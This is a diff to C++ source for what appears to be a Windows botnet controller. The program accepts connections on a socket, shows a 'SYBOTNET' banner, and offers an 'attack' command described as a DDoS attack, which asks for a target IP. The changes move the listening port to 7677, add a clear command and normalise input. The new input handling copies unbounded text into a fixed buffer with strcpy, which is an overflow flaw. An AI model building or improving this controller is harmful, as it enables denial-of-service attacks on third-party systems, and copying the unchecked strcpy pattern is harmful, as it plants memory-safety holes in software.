@@ -1,5 +1,7 @@
 #include<iostream>
+#include<algorithm>
 #include<cstring>
+#include<string>
 #include<thread>
 #include<Windows.h>
 
@@ -36,7 +38,7 @@ int main()
     SOCKADDR_IN addr{0};
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = htonl(INADDR_ANY);
-    addr.sin_port = htons(80);
+    addr.sin_port = htons(7677);
 
     listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
@@ -45,20 +47,36 @@ int main()
 
     std::thread(accept_thread).detach();
 
+    std::cout << "  ::::::::  :::   ::: :::::::::   ::::::::  ::::::::::: ::::    ::: :::::::::: ::::::::::: " << std::endl;
+    std::cout << " :+:    :+: :+:   :+: :+:    :+: :+:    :+:     :+:     :+:+:   :+: :+:            :+:     " << std::endl;
+    std::cout << " +:+         +:+ +:+  +:+    +:+ +:+    +:+     +:+     :+:+:+  +:+ +:+            +:+     " << std::endl;
+    std::cout << " +#++:++#++   +#++:   +#++:++#+  +#+    +:+     +#+     +#+ +:+ +#+ +#++:++#       +#+     " << std::endl;
+    std::cout << "        +#+    +#+    +#+    +#+ +#+    +#+     +#+     +#+  +#+#+# +#+            +#+     " << std::endl;
+    std::cout << " #+#    #+#    #+#    #+#    #+# #+#    #+#     #+#     #+#   #+#+# #+#            #+#     " << std::endl;
+    std::cout << "  ########     ###    #########   ########      ###     ###    #### ##########     ###     " << std::endl;
+
     while(true)
     {
         std::memset(&command, 0, sizeof(info));
 
         std::cout << " [Input] ";
-        std::cin >> command.command;
+        std::string command_string;
+        std::getline(std::cin, command_string);
+        std::transform(command_string.begin(), command_string.end(), command_string.begin(), tolower);
+        strcpy(command.command, command_string.c_str());
 
-        if(strcmp(command.command, "help") == 0)
+        if(command_string == "help")
         {
             std::cout << " HELP                        " << std::endl;
             std::cout << " | attack   ddos attack      " << std::endl;
         }
 
-        else if(strcmp(command.command, "attack") == 0)
+        else if(command_string == "clear")
+        {
+            system("cls");
+        }
+
+        else if(command_string == "attack")
         {
             std::cout << " [TARGET IP] ";
             std::cin >> command.ip;
